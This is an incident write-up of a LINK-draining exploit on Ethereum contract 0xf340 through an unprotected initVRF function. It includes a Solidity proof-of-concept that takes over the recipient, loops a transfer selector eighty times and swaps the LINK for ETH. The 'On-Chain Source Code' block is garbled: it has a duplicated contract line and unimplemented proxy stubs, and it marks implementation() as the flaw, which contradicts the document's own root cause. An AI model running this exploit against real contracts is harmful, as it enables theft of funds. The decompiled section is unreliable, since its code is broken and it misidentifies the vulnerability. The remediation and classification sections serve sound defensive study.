# 0xf340 — initVRF Missing Access Control Analysis

| Field | Details |
|------|------|
| **Date** | 2025-08-20 |
| **Protocol** | 0xf340 (Anonymous Protocol) |
| **Chain** | Ethereum |
| **Loss** | ~4,000 USD |
| **Attacker** | [0xda97a086fc74b20c88bd71e12e365027e9ec2d24](https://etherscan.io/address/0xda97a086fc74b20c88bd71e12e365027e9ec2d24) |
| **Attack Tx** | [0x103b4550...](https://etherscan.io/tx/0x103b4550a1a2bdb73e3cb5ea484880cd8bed7e4842ecdd18ed81bf67ed19e03c) |
| **Vulnerable Contract** | [0xf340bd3eb3e82994cff5b8c3493245edbce63436](https://etherscan.io/address/0xf340bd3eb3e82994cff5b8c3493245edbce63436) |
| **Root Cause** | No access control on `initVRF` function, allowing attacker to set an arbitrary address in storage and drain LINK tokens |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/0xf340_exp.sol) |

---

## 1. Vulnerability Overview

The victim contract `0xf340` has no access control on `initVRF`, its Chainlink VRF initialization function. The attacker called this function directly to write their own address into storage, then repeatedly invoked function selector `0x607d60e6` 80 times to fully drain all LINK tokens held by the contract.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: no access control on initVRF
function initVRF(address recipient, address token) external {
    // No onlyOwner or initializer!
    // Anyone can write recipient and token to storage
    vrfRecipient = recipient;
    vrfToken = token;
}

// 0x607d60e6 function: transfers LINK to vrfRecipient
function distributeLINK(uint256 slot) external {
    // Sends LINK to the recipient set via initVRF
    IERC20(vrfToken).transfer(vrfRecipient, linkPerSlot);
}

// ✅ Fix: add onlyOwner
function initVRF(address recipient, address token) external onlyOwner {
    vrfRecipient = recipient;
    vrfToken = token;
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: 0xf340_decompiled.sol
contract 0xf340 {
contract 0xf340 {

    // Selector: 0x5c60da1b
    function implementation() external {  // ❌ Vulnerability
        // TODO: decompile logic not implemented
    }

    // Selector: 0x3659cfe6
    function upgradeTo(address a) external {
        // TODO: decompile logic not implemented
    }

    // Selector: 0x8f283970
    function changeAdmin(address a) external view returns (uint256) {
        // TODO: decompile logic not implemented
    }

    // Selector: 0xf851a440
    function admin() external view returns (uint256) {
        // TODO: decompile logic not implemented
    }

    // Selector: 0x4f1ef286
    function upgradeToAndCall(address a, bytes calldata b) external {
        // TODO: decompile logic not implemented
    }

}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─▶ calls victim.initVRF(attacker, LINK)
  │         └─ no access control → vrfRecipient = attacker address
  │
  ├─[2]─▶ for (i = 0; i < 80; i++)
  │           calls victim.call(0x607d60e6, 0)
  │           └─ each call transfers LINK to the attacker
  │
  ├─[3]─▶ after 80 iterations, all LINK fully drained
  │
  ├─[4]─▶ swaps LINK for ETH via UniswapV2
  │
  └─[5]─▶ nets ~4,000 USD worth of ETH
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function testExploit() public balanceLog {
    // [1] Call initVRF: recipient = attacker, token = LINK
    // No access control → succeeds immediately
    victim.initVRF(address(this), address(link));

    // [2] Call 0x607d60e6 function 80 times
    // Each call transfers LINK to the attacker (this)
    uint256 slot = 0 ether;
    for (uint256 i = 0; i < 80; i++) {
        (bool success, ) = address(victim).call(
            abi.encodeWithSelector(bytes4(0x607d60e6), slot)
        );
        require(success, "call failed");
    }

    // [3] Swap received LINK for ETH
    uint256 attackerLinkBal = link.balanceOf(address(this));
    link.approve(address(router), attackerLinkBal);

    address[] memory path = new address[](2);
    path[0] = address(link);
    path[1] = address(weth);
    // Swap LINK → ETH via UniswapV2
    router.swapExactTokensForETH(
        attackerLinkBal, 1, path, address(this), block.timestamp + 300
    );
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing Access Control |
| **Attack Vector** | Direct call to initialization function |
| **Impact** | Full drain of all LINK tokens held by the contract |
| **CWE** | CWE-284: Improper Access Control |
| **DASP Classification** | Access Control |

## 6. Remediation Recommendations

1. **Protect initialization functions**: Functions such as `initVRF` that configure contract state must have an `onlyOwner` or `initializer` modifier.
2. **One-time initialization**: Use an `initialized` flag to enforce that the initialization function can only be executed once.
3. **Use constants**: Declare VRF configuration values that never need to change as `constant` or `immutable`.
4. **Minimize function visibility**: Functions that do not need to be called externally should be declared `internal` or `private`.

## 7. Lessons Learned

- Initialization functions (`init*`, `setup*`) are among the most common locations where access control is omitted across DeFi projects.
- Even obfuscated function selectors (e.g., `0x607d60e6`) can be easily discovered and exploited via ABI decoding.
- Initialization code that integrates external services such as Chainlink VRF and Keepers warrants especially careful access control review.